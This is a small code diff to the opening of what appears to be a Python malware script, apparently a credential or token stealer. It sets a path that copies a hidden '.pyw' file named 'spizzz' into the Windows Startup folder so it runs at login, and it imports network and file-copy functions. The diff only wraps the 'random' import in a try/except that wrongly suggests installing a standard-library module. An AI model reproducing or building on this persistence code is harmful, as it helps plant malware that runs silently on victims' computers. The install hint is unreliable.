@@ -1,11 +1,14 @@
 import os
 from os.path import isfile
 from os import getenv, startfile
-import random
 import requests
 from shutil import copy
 from urllib.request import Request, urlopen
 from json import loads
+try:
+    import random
+except:
+    print("pip3 install random")
 
 path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/spizzz.pyw" % getenv("userprofile")
 
